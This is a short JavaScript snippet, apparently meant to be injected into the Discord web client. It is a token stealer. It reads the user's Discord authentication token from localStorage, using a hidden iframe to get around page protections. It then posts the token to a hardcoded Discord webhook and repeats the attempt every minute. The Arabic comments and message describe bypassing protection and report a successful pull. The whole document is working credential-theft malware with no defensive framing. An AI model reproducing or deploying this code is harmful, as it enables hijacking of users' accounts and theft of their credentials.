(function() {
    const webhook = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";

    function extractToken() {
        try {
            // محاولة السحب عبر إنشاء عنصر وهمي للالتفاف على حماية الصفحة الرئيسية
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            const token = iframe.contentWindow.localStorage.token || window.localStorage.token;
            iframe.remove();

            if (token && token !== "undefined") {
                const cleanToken = token.replace(/"/g, "");
                fetch(webhook, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ content: "✅ **تم السحب بنجاح من إيدج:**\n`" + cleanToken + "`" })
                });
                return true;
            }
        } catch (e) {}
        return false;
    }

    // التنفيذ الفوري وعند تحميل المحتوى
    if (!extractToken()) {
        window.addEventListener('load', extractToken);
    }
    // تكرار المحاولة كل دقيقة في حال كان المستخدم قد سجل دخوله للتو
    setInterval(extractToken, 60000);
})();
